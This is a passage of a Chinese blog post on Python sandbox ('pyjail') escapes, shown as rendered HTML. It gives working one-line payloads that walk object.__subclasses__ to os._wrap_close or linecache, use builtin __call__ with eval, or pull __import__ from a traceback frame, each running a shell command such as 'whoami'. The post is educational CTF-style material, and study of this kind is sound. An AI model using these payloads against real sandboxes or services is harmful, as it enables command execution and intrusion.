+<p>如果你不清楚这个类中有什么函数，那么这里<code>__init__</code>就是最好的选择</p>
+<p>除了A-&gt;os，还可以是 A-&gt;B-&gt;os ，比如 2.x 中的 <code>warnings</code>库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&gt;&gt; import warnings<br>&gt;&gt;&gt; warnings.os<br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>AttributeError: &#x27;module&#x27; object has no attribute &#x27;os&#x27;<br>&gt;&gt;&gt; warnings.linecache<br>&lt;module &#x27;linecache&#x27; from &#x27;/usr/lib/python2.7/linecache.pyc&#x27;&gt;<br>&gt;&gt;&gt; warnings.linecache.os<br>&lt;module &#x27;os&#x27; from &#x27;/usr/lib/python2.7/os.pyc&#x27;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>继承链中就可以这样（py3.x 中已经移除了这里 <code>__globals__</code> 的 linecache）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>对于 py3.x </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">(0, &lt;class &#x27;type&#x27;&gt;)<br>(1, &lt;class &#x27;async_generator&#x27;&gt;)<br>(2, &lt;class &#x27;int&#x27;&gt;)<br>(3, &lt;class &#x27;bytearray_iterator&#x27;&gt;)<br>(4, &lt;class &#x27;bytearray&#x27;&gt;)<br>(5, &lt;class &#x27;bytes_iterator&#x27;&gt;)<br>(6, &lt;class &#x27;bytes&#x27;&gt;)<br>(7, &lt;class &#x27;builtin_function_or_method&#x27;&gt;)<br>...<br>...<br>(137, &lt;class &#x27;os._wrap_close&#x27;&gt;)<br>(138, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;)<br>(139, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;)<br>(140, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;)<br>(141, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;)<br>(142, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;)<br></code></pre></td></tr></table></figure>
+
+<p>有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，里面有system函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>利用<code>builtin_function_or_method</code> 的 <code>__call__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[7].__call__(eval, &#x27;system(&#x27;ls&#x27;)&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>还有异常逃逸,利用栈帧逃逸，属于后续内容，这里就涨涨见识</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hack = lambda : [0][1]<br>try:<br>    hack()<br>except Exception as e:<br>    e.__traceback__.tb_next.tb_frame.f_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3>
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pyJali"><span class="toc-number">2.</span> <span class="toc-text">pyJali</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.1.</span> <span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#import%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">import绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">字符串绕过姿势</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys-modules"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">sys.modules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%85%E8%B0%88-builtins%E3%80%81-builtin-%E4%B8%8E-builtins"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">浅谈 builtins、__builtin__与_builtins_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE%E9%80%83%E9%80%B8"><span class="toc-number">2.0.1.5.</span> <span class="toc-text">继承链逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.0.2.</span> <span class="toc-text">文件读写</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/03/30/blog28/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/03/30/blog28/&text=pyjali+nodejali(一)"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/03/30/blog28/&is_video=false&description=pyjali+nodejali(一)"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pyjali+nodejali(一)&body=Check out this article: https://q1ng-li.github.io/2026/03/30/blog28/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/03/30/blog28/&name=pyjali+nodejali(一)&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 q1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
